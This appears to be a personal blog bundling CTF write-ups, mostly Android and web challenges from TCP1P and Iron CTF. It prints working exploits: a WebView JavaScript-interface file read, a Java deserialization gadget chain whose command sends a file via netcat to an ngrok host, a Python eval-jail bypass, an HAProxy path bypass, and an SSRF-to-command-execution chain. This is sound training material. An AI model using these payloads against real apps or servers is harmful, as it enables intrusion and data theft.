content: Hey everyone, last weekend I participated in the much-anticipated TCP1P CTF. I had a great time with their mobile challenges last year, and this year’s challenges were just as good! This time we have 4 challenges and I was able to solve 2 challenges. This time they had poc tester which works well for the challenges. These challenges are now available in github.    Contents    Interfaces [Android]   LookUp [Android]   Password Manager 2.0 [Android]   Interfaces [Android]  In this challenge we have exported MainActivity and WebViewActivity. On launching the app, the main activity redirects us to WebviewActivity with URL https://aimar.id.  // MainActivity.java ... Intent intent = new Intent(this, WebViewActivity.class); intent.putExtra("url", "https://aimar.id/"); startActivity(intent); ...   The webview activity loads the given URL with vulnerable webview setting privileges. So Also the webview registers a javascript interface which looks suspicious which also hints us with the challenge title. Since the webview activity is exported we can pass any URL and make webview load it, but there is a catch. isValidURL checks whether the URL which we are trying to load is of file protocol. So our goal is to read the flag which is in the app’s file directory.  // WebViewActivity.java public void onCreate(Bundle savedInstanceState) { 	...// truncated         this.webView = webView;         WebSettings webSettings = webView.getSettings();         webSettings.setJavaScriptEnabled(true);         webSettings.setAllowFileAccess(true);         webSettings.setAllowContentAccess(true);         webSettings.setAllowFileAccessFromFileURLs(true);         webSettings.setAllowUniversalAccessFromFileURLs(true);         this.webView.addJavascriptInterface(new MyJavascriptInterface(this.webView), randomString(32));         this.webView.setWebViewClient(new WebViewClient() { // from class: app.aimar.id.interfaces.WebViewActivity.1             public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {                 ... // truncated             }         });         Uri uri = Uri.parse(getIntent().getStringExtra("url"));         if (uri != null && isValidURL(uri)) {             this.webView.loadUrl(uri.toString());         } else {             finish();         }     }  public String randomString(int length) { StringBuilder sb = new StringBuilder(); for (int i = 0; i < length; i++) {     int index = (int) ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length() * Math.random());     sb.append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(index)); } return sb.toString(); }  boolean isValidURL(Uri uri) { if (uri.getScheme().equals("file")) {     Log.i("WebViewActivity", "Invalid scheme: " + uri.getScheme());     return false; } return true; }   To read file we can use javascript interface to load file URLs. But here the catch is if the URL contains flag.txt string it loads aimar.id. After fuzzing with webview, I found out that we can load URL encoded string in webview which while uri parsing won’t decode it. So the idea is to load our webpage and find the interface using javascript since javascript is enabled in webview. And then using the javascript interface to load URL encoded file URL. Even with setAllowUniversalAccessFromFileURLs I tried loading file using XMLHttpRequest as mentioned in this blog but it failed. Not sure whether new android apis prevents this.  // MyJavascriptInterface.java @JavascriptInterface public void loadUrlSafe(final String url) {     Uri uri = Uri.parse(url);     if (uri.toString().contains("flag.txt")) {         this.webView.post(new Runnable() { // from class: app.aimar.id.interfaces.MyJavascriptInterface.1             @Override // java.lang.Runnable             public void run() {                 MyJavascriptInterface.this.webView.loadUrl("https://aimar.id/");             }         });     } else {         this.webView.post(new Runnable() { // from class: app.aimar.id.interfaces.MyJavascriptInterface.2             @Override // java.lang.Runnable             public void run() {                 MyJavascriptInterface.this.webView.loadUrl(url);             }         });     } }   I crafted the below javascript to find out the interface which in our case is random string of length 32. The used it to call the javascript Interface method loadUrlSafe with file URL.  <html> 	<body> 	<script> 		var windows_obj = Object.getOwnPropertyNames(window);         var res = ""         const findOne = (obj) => {             try {                 // Ensure that window[obj] is a valid object                 if (window[obj] && typeof window[obj] === 'object') {                     return Object.getOwnPropertyNames(window[obj]);                 }             } catch (e) {                 // Catch errors when trying to access certain properties                 return null;             }             return null;         };          for (var i = 0; i < windows_obj.length; i++) {             var window_obj = windows_obj[i] ?? "document";               if (window_obj === null || typeof window_obj === 'undefined') {                 continue;             }              var obj_props = findOne(window_obj);              if (obj_props && obj_props[0] === 'loadUrlSafe') {                 var interface = window_obj;                 console.log(interface);             }         }         var interface_obj = window[interface]          interface_obj.loadUrlSafe("file:///data/user/0/app.aimar.id.interfaces/files/%66%6c%61%67%2e%74%78%74") 	</script> 	</body>  </html>   And creating my poc app which sends the URL to the WebViewActivity.  public class MainActivity extends AppCompatActivity {     protected void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.activity_main);          Intent intent = new Intent();         intent.setClassName("app.aimar.id.interfaces","app.aimar.id.interfaces.WebViewActivity");          String url = "https://white-misty-90.tiiny.site/"; // hosted HTML content          intent.putExtra("url",url);         startActivity(intent);         }     }   Initially the challenge also checks if the domain name ends with aimar.id in isValidURL method. But later the challenge author updated it to load any URL to prevent solvers from buying domain ending with aimar.id since it has only endswith check. I couldn’t find any way to laod arbitrary URL if this is present. Tried all these tricks but android parses url correctly now. Maybe they could have updated in recent APIs. Another way is find any xss in aimar.id host. But it is a static phpinfo page, even the php is updated to recent version. I will update here if challenge author posts any writeup.    LookUp [Android]  This challenge took quite a while to complete, but I managed to solve it in the end. This challege has exported activity RealTimeUpdateActivity which does nothing but receiving our intent and reading extras from our intent. Since android bundle that can be Parcelable and Serializable objects. So it is clear our goal is to solve using deserialization. I have previous knowledge of deserialization in android reading these blogs 1 and 2.  public class RealTimeUpdateActivity extends AppCompatActivity {     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         Intent intent = getIntent();         Bundle bundle = intent.getExtras();         if (bundle != null) {             for (String extra : bundle.keySet()) {                 Log.d("extra", "sucessfully deserialized " + intent.getStringExtra(extra));             }         }     } }   public class Testing2 implements Serializable {     private Object object;     private void readObject(ObjectInputStream ois) throws ClassNotFoundException, IOException {         ois.defaultReadObject();         Log.d("extra", this.object.toString());     } }   public class Testing implements Serializable {     private String cmd;     public String toString() {         StringBuilder output = new StringBuilder();         try {             Process process = Runtime.getRuntime().exec(this.cmd);             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));             while (true) {                 String line = reader.readLine();                 if (line != null) {                     output.append(line).append("\n");                 } else {                     reader.close();                     return output.toString();                 }             }         } catch (IOException e) {             throw new RuntimeException(e);         }     } }   Also the challenge has the gadget class Testing.java which executes cmd. Testing.java which is serializable class which tries to read our object and construct it. Using these two we can create gadget chain and pass intent with serializable. When victim app reads intent.getStringExtra() , it calls readObject of our Testing2 object which calls toString() method of Testing object and finally invoking exec.  For setting the variable cmd as well as object we can use Java reflections since there are no public setters to set it in the object. This is the common way used while exploiting deserialization bugs, a neat blog explaining this.  public class MainActivity extends AppCompatActivity {      @Override     protected void onCreate(Bundle savedInstanceState) {         try {             Field f = Testing.class.getDeclaredField("cmd");             f.setAccessible(true);             Log.d("foobar::",f.getName());              Testing testing = new Testing();             f.set(testing,"whoami");                          Testing2 testing2 = new Testing2();             Field f2 = Testing2.class.getDeclaredField("object");             f2.setAccessible(true);             f2.set(testing2,testing);              Intent intent = new Intent();             intent.setClassName("com.dimas.lookup","com.dimas.lookup.RealTimeUpdateActivity");              Bundle bundle = new Bundle();             bundle.putSerializable("exploit",testing2);             intent.putExtras(bundle);             startActivity(intent);           } catch (NoSuchFieldException e) {             throw new RuntimeException(e);         } catch (IllegalAccessException e) {             throw new RuntimeException(e); 	    }     } }    In order to construct the serialized object we should have Testing.java and Testing2.java in our project structure with same package name.  project structure ->java     ->com         ->dimas.lookup             ->Testing.java             ->Testing2.java         ->example.tcpip             ->MainActivity.java     In victims app logcat we can see that the output of our command whomai is run successfully. But now comes the hard part where I spent literally half day to get the flag. To get the flag we should read flag.txt in app files directory. But somehow I can’t combine commands using pipe or redirect operator. After struggling for few hours I came to know that it is the default behaviour of java’s runtime exec.  Later using this blog I was able craft my payload with pipes.  f.set(testing,"sh -c $@|sh . echo cat /data/user/0/com.dimas.lookup/files/fl* | nc 0.tcp.in.ngrok.io 12424");   This reads flag from the apps directory and pipes it to our netcat connection. Also android system has only few binaries. I couldn’t find any other binaries to exfiltrate contents remotely.  Listening nc on port 9090 and using ngrok to port forward it, I was able to receive the flag from the remote system.  ~nc -nlvp 9090  > recvd Connection received   ~cat recvd TCP1P{basic_deserialization_in_android_is_awssome_485846283}   You can also use payload generator from here. I won’t forgive java for this 😭.  Password Manager 2.0 [Android]  This is the only unsolved android challenge at end of CTF. But after the CTF ended, a CTF player posted his writeup here. I was able to read pwds.yml using vulnerable file provider during CTF, but still the writeup shows that it is a long way to achieve RCE.

title: Iron CTF 2024 Writeup
content: Hi guys, after long time this weekend I played Iron ctf which is hosted by SASTRA University. Really a wonderful CTF after and I was abled to solve few challenges. I concentrated mostly on android and web challenges, and was able to solve all android challenges as well as few web challenges.  Contents    Fire in the Base Camp[Android]   Secure Vault[Android]   Is this Android[Android]   Loan App[Web]   b64SiteViewer[Web]     Fire in the Base Camp [Android]  From the challenge we can guess that the challenge is based on firebase. Firebase is a real time database which many android application uses. One common security misconfiguration is using firebase databases without authentication, similar to connecting to mysql DB without password. More about this in blog.    After decompiling the apk and analyzing mainactivity, we can find that it is using firebase DB. This is a simple dice rolling app which expects count value of 9999999 to read the flag. Initially I thought it would be easy if I made the counter value to 9999999. My idea is to use frida since it take less effort than manually changing the apk. So I wrote this frida script and ran the app.  Java.perform(()=>{ 	var main;     Java.choose("com.example.app3.MainActivity",{         onMatch : function(instance){ 			var Int_class = Java.use("java.lang.Integer"); 			var a = Int_class.$new(9999998);  			instance.count.value = a;             console.log("[+] instance called" + instance.count.value);         },         onComplete: function(){}     }); })   Value is set to 9999998 so that the next time If I roll the dice it would become 9999999 and gets the flag. But insted it just toasted Congratulations!! You know where the flag is. message. The app didn’t even made the request to the URL. So I tried to the make the request URL from the resource file and applying slice but it doesn’t help.  MainActivity.this.mDatabase.child(MainActivity.this.path1 + MainActivity.this.path2 + MainActivity.this.path3 + MainActivity.this.path4 + MainActivity.this.path5).get()   But after few minutes later the toast message made sense. So i just made call to usual .json endpoint of the firebase URL.    Secure Vault [Android]  In this challenge the objective is to finc the secret password to the vault. Initially I decopiled using jadx and found out that the app was built using flutter. Usually uses flutter using dart VM for running and reverse engineering one is usually harder than normal apk. For this challenge I used a tool called blutter. There is flutter reverse enginneer video which explains this well.    python3 blutter.py secure_vault/lib/arm64-v8a out_dir   After running the tool we can get the out_dir which contains asm folder which contains disassembled dart code. Going through the main.dart file found _checkPassword which checks password with base64 decoded string of aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0=. After base64 decoding the string, we can get the flag.  echo "aXJvbkNURnswaF9teV9nMGQhIV95MHVfYnIwazNfaW50MF90aDNfNHBwXzRmNmUyMmNiYX0=" | base64 -d ironCTF{0h_my_g0d!!_y0u_br0k3_int0_th3_4pp_4f6e22cba}   Is this Android[Android]  This challenge as title suggested not an android challenge but rather a web challenge. Initially we are given calculator app based on flutter which performs calculation. But instead it showed error for any calculations.    After revering it like the previous app, we can find calc.dart in asm folder which contains the assembly code. To start our reversing I started searching for the string Error!, which we got while trying to calculate values from the app. The search leads us nearer to the _calculate function. The function looks it calls endpoint `` with our input to evaluate the expression.      // 0x22eb14: r1 = "https://calc.1nf1n1ty.team/calculate"     //     0x22eb14: add             x1, PP, #9, lsl #12  ; [pp+0x9ce8] "https://calc.1nf1n1ty.team/calculate" 					...     //     0x22eb20: bl              #0x183b44  ; [dart:core] Uri::parse 					...     //     0x22eb40: add             x16, PP, #9, lsl #12  ; [pp+0x9cf8] "application/json" 					...     //     0x22eb4c: add             x16, PP, #9, lsl #12  ; [pp+0x9d00] TypeArguments: <String, String> 					...     //     0x22eb6c: add             x16, PP, #9, lsl #12  ; [pp+0x9d08] "expression"                     ...     //     0x22ebac: bl              #0x231228  ; [package:http/http.dart] ::post    Stripped few lines for ease of understanding. From the assembly code it is clear that the app is trying to make HTTP POST request with json {“expression”:”our_expression”}. Since it is a HTTP request our Burp interceptor should have captured it. But unfortunately I didn’t found any HTTP calls being made from app. So I tried to make one HTTP call.  curl -X POST -H "Content-Type: application/json" --data-binary $'{\"expression\":\"1+2\"}' "https://calc.1nf1n1ty.team/calculate" {"result":3}    With the confusion whether to contine to attack mobile app or web app, I asked organizers about it. And they hinted that I am going in correct decision. With this green flag I continued to explore the endpoint and found that it was python server which eval our input. So basically its going to be a pyjail challenge. After tinkering with it for a while found that few keywords like system, os, dir are blocked. Few characters like [’,”,g,f,l,x]. After few trial and errors, I was able to come up with payload which doesn’t use any of the keywords restricted as well as able to bypass single and double quote check by appending characters to form string.  __import__('os').__dict__['popen']('cat /flag.txt').read() # the actual payload  __import__(chr(111)+chr(115)).__dict__[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()      Loan App[Web]  In this challenge, we are given a user registration and login panel. Once logged in we can request loan and according to the soruce provided admin can approve but there is no admin check. So any user can call the endpoint and approve loan. But when accessing admin the server throws Request forbidden by administrative rules.. After analyzing the source it is clear that haproxy is configured as reverse proxy which throws this error. The below haprxy rule denies our request.  frontend http_front     mode http     bind :80     acl is_admin path_beg /admin     http-request deny if is_admin     default_backend gunicorn    When a request URL which begins with /admin is denied. To bypass tried vaious methods and URL encoding a character or the word admin works.  curl -X POST http://loanapp.1nf1n1ty.team/%61dmin/loan/6706c2fd3b619fc5054d4289 OK #response     Wierd Uninted Solution  After solution someone solved the challege in a really wierd way. The challenge accepts only valid uuidv4 string for registering. But someone googled valid uuidv4 and got uuid from first stackoverflow. After logging in with the same uuidv4 username and password. They were able to get flag, Since some other team have already solved using the same uuidv4 :) .    b64SiteViewer[Web]  In this challenge we are welcomed with URL input box which visits our URL. Trying localhost and 127.0.0.1 throws error, after analyzing the source it is clear there are checking with blacklist.  ... blacklist_scheme=['file','gopher','php','ftp','dict','data'] blacklist_hostname=['127.0.0.1','localhost','0.0.0.0','::1','::ffff:127.0.0.1'] if scheme in blacklist_scheme:     return render_template_string('blocked scheme')      if hostname in blacklist_hostname:     return render_template_string('blocked host') ...   Using http://2130706433:5000 URL from payload all the things works. The admin URL route checks for internal ip address check, So we can call admin URL with this SSRF and also it is obvious that it executes command from user input.  @app.route('/admin') def admin():     remote_addr = request.remote_addr          if remote_addr in ['127.0.0.1', 'localhost']:         cmd=request.args.get('cmd','id')         cmd_blacklist=['REDACTED']         if "'" in cmd or '"' in cmd:             return render_template_string('Command blocked')         for i in cmd_blacklist:             if i in cmd:                 return render_template_string('Command blocked')         print(f"Executing: {cmd}")         res= subprocess.run(cmd, shell=True, capture_output=True, text=True)         return res.stdout     else:         return render_template_string("Don't hack me")   But still there are few restrictions in place. We can’t execute common commands like cat, python, perl, ... . Using ls we can find the current directory files, One interesting file run.sh. tail command is not blocked ,so we can use tail with file name regex[since app.py, run.sh files are blocked in user input]. tail -n 10 ap* to get last 10 lines from app.py.  tail -n 10 run*   Flag is set as environment variable in run.sh file.

title: TFCCTF 2024 Writeup
content: Hi guys, This weekend I attended TFC CTF which was fun and I learnt a lot of new things. Also I tried most of the web challenges but able to complete only one. But in this writeup I am going to discuss about other challenges and their solutions from discord. The challege I solved is Safe_Content ,a medium web challenge.  Contents    Greetings[Web]   Surfing[Web]   Funny[Web]   Safe_Content[Web]   license[Reverse]   Greetings [Web | Warmup]  Yes, I didn’t solved this challenge during CTF. Basically we are given a web app which returns welcome message with our name. So the initially step is to test for SSTI and XSS. Xss worked but it was not an XSS challenge.
